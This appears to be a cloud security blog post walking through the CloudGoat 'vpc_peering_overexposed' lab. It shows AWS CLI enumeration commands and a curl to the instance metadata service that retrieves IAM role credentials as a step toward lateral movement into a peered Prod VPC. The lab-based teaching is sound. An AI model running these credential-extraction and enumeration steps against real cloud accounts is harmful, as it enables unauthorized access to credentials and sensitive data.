---
title: '100 Days of Cloud Security - Day 32: Attack — `vpc_peering_overexposed` — Part 1'
date: '2025-12-11'
author: 'Venkata Pathuri'
excerpt: 'Day 32 of my cloud security journey - Attack — `vpc_peering_overexposed` — Part 1'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 32: Attack — `vpc_peering_overexposed` — Part 1

## Overview
Welcome back to Day 32 of our cloud security journey! Today, we're diving into an intriguing attack scenario called `vpc_peering_overexposed`. This exercise builds on our previous discussions about VPCs and IAM roles, expanding our focus to how VPC peering can inadvertently expose sensitive data. By the end of this session, you'll not only understand the mechanics behind this attack but also gain practical skills to identify and mitigate similar risks in your cloud environment.

## Learning Objectives
In this session, we aim to achieve several key objectives. First, you'll learn how to set up the CloudGoat `vpc_peering_overexposed` scenario, which simulates a real-world attack vector involving VPC peering. You will master the process of enumerating AWS resources, exploiting instance metadata services for credential extraction, and leveraging VPC peering to access sensitive data in another VPC. This knowledge will be invaluable in your journey to securing cloud environments and understanding the risks associated with misconfigured cloud resources.

## Deep Dive
Let's begin by exploring the components of our attack scenario. We have two Virtual Private Clouds (VPCs) set up: **Dev** (`10.10.0.0/16`) and **Prod** (`10.20.0.0/16`). These VPCs are interconnected through a VPC peering connection, which facilitates communication between them. In the **Dev** VPC, we have an EC2 instance that serves as our initial foothold, while the **Prod** VPC hosts an RDS MySQL instance containing mock PCI and PII data.

### Understanding the Attack Flow
1. **Enumeration**: Our first step involves gathering information about the AWS environment from the Dev EC2 instance. This includes identifying other EC2 instances, VPCs, and their respective configurations.
2. **Exploiting IMDS**: By using the Instance Metadata Service (IMDS), we can access IAM role credentials associated with our EC2 instance. This is a critical step, as it allows us to escalate our privileges beyond the initial static credentials.
3. **Inspecting VPC Peering**: After obtaining the role credentials, we will inspect the VPC peering configurations and route tables. Understanding these configurations is crucial as they dictate how traffic flows between the two VPCs.
4. **Lateral Movement**: Utilizing the peering connection, we will move laterally into the Prod VPC and access the RDS instance to extract sensitive data.

### Practical Example
As we progress through these steps, you can execute the following commands to gather information:

**List EC2 Instances**
```bash
aws ec2 describe-instances --profile cg
```
This command will return details about the EC2 instances in your Dev VPC. You might observe that your instance uses IMDSv1, which is a critical vulnerability point.

**List VPCs**
```bash
aws ec2 describe-vpcs --profile cg
```
This will provide the VPC IDs and CIDR blocks for your environment. You should see both the Dev and Prod VPCs listed.

**Inspect Route Tables**
```bash
aws ec2 describe-route-tables --profile cg
```
Review both Dev and Prod route tables to confirm the active VPC peering connection and its configurations. Notably, check for any routes that enable cross-VPC traffic.

## Hands-On Practice
1. **SSH into the Dev Instance**:
   First, connect to your Dev EC2 instance using SSH:
   ```bash
   ssh -i cloudgoat.pem ec2-user@13.221.132.171
   ```

2. **Retrieve IAM Role Credentials**:
   Next, utilize IMDS to obtain IAM role credentials:
   ```bash
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/dev-ec2-role-cgidmi20onzqbx
   ```

3. **Validate Identity**:
   Confirm the identity of the assumed role with:
   ```bash
   aws sts get-caller-identity --profile dev-role
   ```

4. **Describe VPC Peering Connections**:
   Check the VPC peering connections using your assumed role:
   ```bash
   aws ec2 describe-vpc-peering-connections --profile dev-role --region us-east-1 --no-cli-page
   ```

5. **Enumerate EC2 Instances**:
   Finally, list all instances you can access:
   ```bash
   aws ec2 describe-instances --profile dev-role --region us-east-1
   ```

### Expected Outcomes
After executing these commands, you should have a clear view of your cloud environment, identified vulnerabilities, and gained access to the necessary credentials to proceed with lateral movement into the Prod VPC.

### Common Troubleshooting Tips
- If you're unable to retrieve IAM role credentials, ensure that your instance is configured to allow access to IMDS.
- Verify that your AWS CLI is configured correctly with the appropriate profile.

## Key Takeaways
Today, we learned the importance of understanding VPC configurations and the risks associated with VPC peering. We explored how an attacker could exploit these setups to gain unauthorized access to sensitive data. By familiarizing ourselves with these concepts, we can better secure our cloud environments against similar attacks.

## Real-World Applications
The lessons learned today are highly applicable in production environments. Organizations often configure VPC peering for operational efficiency but may overlook security implications. By recognizing potential vulnerabilities and implementing best practices, such as restricting IAM roles and ensuring proper route table configurations, we can significantly enhance cloud security.

---
**Journey Progress:** 32/100 Days Complete 🚀